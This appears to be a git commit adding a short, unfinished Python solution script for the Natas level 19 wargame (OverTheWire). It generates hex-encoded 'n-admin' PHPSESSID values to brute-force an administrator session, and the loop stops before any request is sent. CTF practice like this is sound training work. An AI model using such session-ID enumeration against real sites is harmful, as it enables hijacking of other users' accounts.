41884d7cb9043e3fde5c6b82403de80b3102f3c7
omega-coder <fy_cherief@esi.dz>
2019-04-05 01:53:44 +0200

    hexes the cookies

---
+++ Natas/level19/solve.py
@@ -0,0 +1,13 @@
+#!/usr/bin/python3
+
+# coding : utf-8
+
+
+import requests
+
+URL = "http://natas19.natas.labs.overthewire.org"
+cookies = {'PHPSESSID': ''}
+
+for i in range(1, 641):
+    cookies['PHPSESSID'] = '{}-admin'.format(i).encode().hex()
+
